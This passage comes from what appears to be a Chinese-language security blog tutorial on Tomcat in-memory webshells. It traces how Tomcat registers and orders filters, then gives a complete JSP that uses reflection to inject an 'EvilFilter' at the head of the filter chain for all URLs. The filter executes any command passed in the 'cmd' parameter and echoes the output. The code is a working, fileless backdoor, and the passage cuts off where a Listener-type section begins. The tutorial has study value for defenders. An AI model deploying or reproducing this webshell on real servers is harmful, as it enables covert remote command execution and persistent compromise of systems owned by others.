addFilter 方法。</p><p>其中的核心代码就是这块。大致流程就是利用 FilterDef 对 Filter 进行一个封装，然后 filtrDef 进行一些属性的赋值（Filter 名，Filter 的 Class 等等）。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105402858.png" alt="image-20230103105402858"></p><p>因此我们提取出来，就得到如下动态注册 Filter 的代码。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105411065.png" alt="image-20230103105411065"></p><h2 id="分析如何绑定filter到chain的最开头并让其生效"><a class="anchor" href="#分析如何绑定filter到chain的最开头并让其生效">#</a> 分析如何绑定 Filter 到 chain 的最开头并让其生效</h2><p>上面我们也只是实现了 Filter 的注册而已，实际上我们并没有把这个 Filter 给用起来。并且我们对怎么把这个 Filtet 放到 Chain 的最开头也不清楚。</p><p>因此我们想要知道怎么去操作就得分析下正常 Filter 的调用流程。</p><p>根据 tomcat 的流程和我们前面的分析，可以得知 Tomcat 的 web 启动后在初始化 Context 的时候会调用 StandardContext 来实现部分功能，所以 Filter 的初始化应该也是在这个类中完成。这里我们发现一个 filterStart 方法，所以我们就从这个方法入手上断点开始追踪。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105433266.png" alt="image-20230103105433266"></p><p>我们直接上断点分析，可以看到大概流程</p><p>这里应该是先执行了 addfilter 等到所有的 filter 都被封装成 filterDef 并存储到 filterDefs 后才到 filterStart 这个方法（逻辑上也应该如此），而在这个方法当中，我们可以看到，它把 filterDef 重新提取了出来了，对其再进行了一层封装，然后又如法炮制塞到了 filterConfigs 当中。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105440020.png" alt="image-20230103105440020"></p><p>因此这里我们可以得知只要将 Filter 封装成 FilterDef，再向上封装成 FilterConfig，放入 StandardContext 对象的 FilterConfigs 就能够动态注册并启动我们的 filter。</p><p>但问题来了，url 绑定在哪呢？？这里已经是最后的一步了，所以我觉得 URL 配置肯定就在这个 filterConfig 对象里面，我们查看它的结构</p><p>最终在 filterConfig.context.filterMaps 中找到了 url 配置。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105448124.png" alt="image-20230103105448124"></p><p>接着我们就需要找这个值是怎么赋予给 filterConfig 的，本来是需要跟进这个 ApplicationFilterConfig 的，但我发现这里的参数 this 就是 context，所以没必要跟进了（这层封装就只是简单的把 standardContext 和 filterDef 给粘合到一块而已）。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105500832.png" alt="image-20230103105500832"></p><p>其实到这里思路就很清晰了，我们只需要以下操作即可：</p><p>①把我们的恶意 Filter 封装成 FilterDef，动态注册成 filter。（这一步上面已经完成了）</p><p>②为我们恶意 Filter 构造 FilterMap（这一步就是 urlpattern 绑定）</p><p>③把 FilterDef 和 FilterMap 一块向上封装成 FilterConfig（利用反射获取 ApplicationFilterConfig 对象，调用私有构造方法）</p><p>④最后 put 进 StandardContext 对象的 FilterConfigs 即可。（利用反射获取 StandardContext 对象的 FilterConfigs 属性，然后 put 进去）</p><p>但我们是不是还忘记了什么！没错，怎么把我们的这个 Filter 给放到 FilterChain 的最前面呢？？</p><p>这里我们发现 StandardContext 有一个名为 addFilterMapBefore 的方法，也就是说调用这个方法就能够让我们的 Filter 放到最前。</p><p>查看里面的具体代码，不难看出大致就是把我们的 filterMap 给放到 filterMaps 这个数组的最前面。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105510395.png" alt="image-20230103105510395"></p><p>而我们知道 put 进 FilterConfigs 其实就是启动 Filter 了。因此这一步肯定是在这之前完成的。因此我们最终整合步骤如下：</p><p>①把我们的恶意 Filter 封装成 FilterDef，动态注册成 filter。（这一步上面已经完成了）</p><p>②为我们恶意 Filter 构造 FilterMap（这一步就是 urlpattern 绑定）</p><p>③调用 StandardContext 的 addFilterMapBefore 方法，把我们的 FilterMap 给放到 FilterMaps 最前面。</p><p>④把 FilterDef 和 FilterMap 一块向上封装成 FilterConfig，</p><p>⑤最后 put 进 StandardContext 对象的 FilterConfigs 即可。（利用反射获取 StandardContext 对象的 FilterConfigs 属性，然后 put 进去）</p><h2 id="为恶意filter构造filtermap"><a class="anchor" href="#为恶意filter构造filtermap">#</a> 为恶意 Filter 构造 FilterMap</h2><p>在这之前，先看看我们的目标 FilterMaps 需要什么属性。<br>这里我们可以看到，<strong>比较关键的是这个 filterName 和 URLPatterns 还有 dispatcherMapping</strong> (其他参数在 FilterMap 类中都是默认值或者说是私有属性，并且没有相应的方法能操控)</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105544175.png" alt="image-20230103105544175"></p><p>然后需要了解怎么去构造，就需要进入到 FilterMap 这个类查看它的方法和属性，分析它是怎么封装的。我们关注的三个属性虽然是私有属性，但幸好我们有对应的方法能操控，不然只能上反射了。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105555893.png" alt="image-20230103105555893"></p><p>其中需要提一下的只有 dispatcherMapping 这个属性的赋值方法 setDispatcher。</p><p>在之前我们需要先了解 dispatcher 是什么，看下面，其实不难理解，就是这个请求是怎么来的？内部请求还是用户真实的请求，也就是说我们的过滤器不只是可以 url 的作用范围，还能设置请求方式（注意：不是 http 方法）的范围。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105606959.png" alt="image-20230103105606959"></p><p>可以看到，这个方法其实就是设置我们的 dispatcher 是什么类型的，我们自然是要<strong> REQUEST</strong> 类型的。</p><p>而我们简单看下方法，<span class="exturl" data-url="aHR0cDovL3huLS1EaXNwYXRjaGVyVHlwZS1rdTh2eGQ4NzlndHVheTk3b2R5eWF5MmNnNGFmNDU2YTZrNWNramwuUkVRVUVTVC5uYW1l">很明显了只要让参数等于 DispatcherType.REQUEST.name</span> () 就实现我们的目的了。(虽然上图中说默认情况下它的值是 REAUEST，但在代码中它初始值是<strong> NOT_SET</strong>)</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105619126.png" alt="image-20230103105619126"></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105622809.png" alt="image-20230103105622809"></p><p>尝试一下进行封装，差不多就是这样。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105632367.png" alt="image-20230103105632367"></p><h2 id="使用addfiltermapbefore把我们的链放到最前"><a class="anchor" href="#使用addfiltermapbefore把我们的链放到最前">#</a> 使用 addFilterMapBefore 把我们的链放到最前</h2><p>紧接着就是把我们的这个 filter 放到代理链的最前了，我们再看看这个方法</p><p>一共就三行代码，第一行是验证我们的 FilterMap 的，第二行则是把它加到 filterMaps 中，最后一个是</p><p>去通知所有容器事件侦听器此容器发生了添加 FilterMap 事件。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105649373.png" alt="image-20230103105649373"></p><p>其实没什么好提取的，我们直接调用就行了。</p><h2 id="把filterdef和filtermap一块向上封装成filterconfig"><a class="anchor" href="#把filterdef和filtermap一块向上封装成filterconfig">#</a> 把 FilterDef 和 FilterMap 一块向上封装成 FilterConfig</h2><p>这里封装本来想直接调用 ApplicationFilterConfig 类，但很可惜，这个类不是 public 类，因此我们只能通过反射来获取它，再调用它的私有构造器了。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105705440.png" alt="image-20230103105705440"></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105708249.png" alt="image-20230103105708249"></p><h2 id="最后put进standardcontext对象的filterconfigs即可"><a class="anchor" href="#最后put进standardcontext对象的filterconfigs即可">#</a> 最后 put 进 StandardContext 对象的 FilterConfigs 即可</h2><p>最后，我们只差一步，这里只需要拿到 StandardContext 的 filterConfigs 对象，然后 put 我们的 filterconfig 进去即可。</p><p>同样的需要用反射来完成。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105719035.png" alt="image-20230103105719035"></p><h2 id="最终代码"><a class="anchor" href="#最终代码">#</a> 最终代码</h2><p>然后我们把上面各个部分进行整合，再优化一下就得到如下内存马：</p><p>我们这里提前获取 FilterConfigs，用于判断 Filter 名字有没有冲突。</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token class-name">Created</span> by <span class="token class-name">IntelliJ</span> <span class="token class-name">IDEA<span class="token punctuation">.</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>  User<span class="token operator">:</span> momo</pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token class-name">Date</span><span class="token operator">:</span> <span class="token number">2022</span><span class="token operator">/</span><span class="token number">11</span><span class="token operator">/</span><span class="token number">14</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token class-name">Time</span><span class="token operator">:</span> <span class="token number">13</span><span class="token operator">:</span><span class="token number">12</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token class-name">To</span> change <span class="token keyword">this</span> template use <span class="token class-name">File</span> <span class="token operator">|</span> <span class="token class-name">Settings</span> <span class="token operator">|</span> <span class="token class-name">File</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">--</span><span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.Scanner"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.*"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"javax.servlet.http.*"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.Wrapper"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Constructor"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationFilterConfig"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.Context"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.HashMap"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">class</span> <span class="token class-name">EvilFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> config<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"text/html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>            <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>            <span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>                <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>                <span class="token class-name">Scanner</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>                <span class="token class-name">String</span> result <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> scanner<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>                out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>                <span class="token keyword">return</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>            chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token class-name">EvilFilter</span> evilFilter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EvilFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token class-name">String</span> name <span class="token operator">=</span><span class="token string">"evilFilter2"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token class-name">PrintWriter</span> printWriter <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token comment">// 获取 ServletContext 对象 (得到的其实是 ApplicationContextFacade 对象)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token comment">// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span>standardContext <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>        <span class="token comment">// 因为是 StandardContext 对象是私有属性，所以需要用反射去获取</span></pre></td></tr><tr><td data-num="55"></td><td><pre>        <span class="token class-name">Field</span> f <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>        <span class="token class-name">Object</span> object <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>object <span class="token keyword">instanceof</span> <span class="token class-name">ServletContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>            servletContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ServletContext</span><span class="token punctuation">)</span> object<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>object <span class="token keyword">instanceof</span> <span class="token class-name">StandardContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>            standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> object<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>    <span class="token comment">// 通过反射获取 StandardContext 对象的 filterConfigs 属性</span></pre></td></tr><tr><td data-num="65"></td><td><pre>    <span class="token class-name">Field</span> filterConfigsField <span class="token operator">=</span> standardContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>    filterConfigsField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>    <span class="token class-name">HashMap</span> filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HashMap</span><span class="token punctuation">)</span> filterConfigsField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>filterConfigs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>        <span class="token comment">// 将 evilFilter 封装成 FilterDef</span></pre></td></tr><tr><td data-num="70"></td><td><pre>        <span class="token class-name">FilterDef</span> filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>        filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>        filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>evilFilter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>        filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>evilFilter<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>        <span class="token comment">// 动态注册 Filter</span></pre></td></tr><tr><td data-num="75"></td><td><pre>        standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="76"></td><td><pre></pre></td></tr><tr><td data-num="77"></td><td><pre>        <span class="token comment">// 为恶意 Filter 构造 FilterMap</span></pre></td></tr><tr><td data-num="78"></td><td><pre>        <span class="token class-name">FilterMap</span> filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>        filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>        filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>        filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span><span class="token class-name">DispatcherType</span><span class="token punctuation">.</span>REQUEST<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="82"></td><td><pre></pre></td></tr><tr><td data-num="83"></td><td><pre>        <span class="token comment">// 将我们的 filterMap 放到最前</span></pre></td></tr><tr><td data-num="84"></td><td><pre>        standardContext<span class="token punctuation">.</span><span class="token function">addFilterMapBefore</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="85"></td><td><pre>        <span class="token comment">// 通过反射调用 ApplicationFilterConfig 将 filterDef 和 FilterMap 向上一块封装成 FilterConfig</span></pre></td></tr><tr><td data-num="86"></td><td><pre>        <span class="token class-name">Constructor</span>  filterConfigConstructor <span class="token operator">=</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">FilterDef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="87"></td><td><pre>        filterConfigConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="88"></td><td><pre>        <span class="token class-name">FilterConfig</span> filterConfig <span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span><span class="token punctuation">)</span> filterConfigConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">,</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="89"></td><td><pre>        filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="90"></td><td><pre>        printWriter<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"inject success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="91"></td><td><pre></pre></td></tr><tr><td data-num="92"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="93"></td><td><pre>        printWriter<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"wrong,web was have "</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">" filter,pleas change a name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="94"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="95"></td><td><pre></pre></td></tr><tr><td data-num="96"></td><td><pre></pre></td></tr><tr><td data-num="97"></td><td><pre></pre></td></tr><tr><td data-num="98"></td><td><pre><span class="token operator">%</span><span class="token operator">></span></pre></td></tr></table></figure><p>最终效果如下：</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105753616.png" alt="image-20230103105753616"></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105756348.png" alt="image-20230103105756348"></p><h1 id="listen类型内存马"><a class="anchor" href="#listen类型内存马">#</a> Listen 类型内存马</h1><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veXlodW5pL3AvMTU1MTI3OTIuaHRtbCNzZXJ2bGV0cmVxdWVzdGxpc3RlbmVyJUU2JThFJUE1JUU1JThGJUEz">https://www.cnblogs.com/yyhuni/p/15512792.html#servletrequestlistener%E6%8E%A5%E5%8F%A3</span></p><p><span class="exturl" 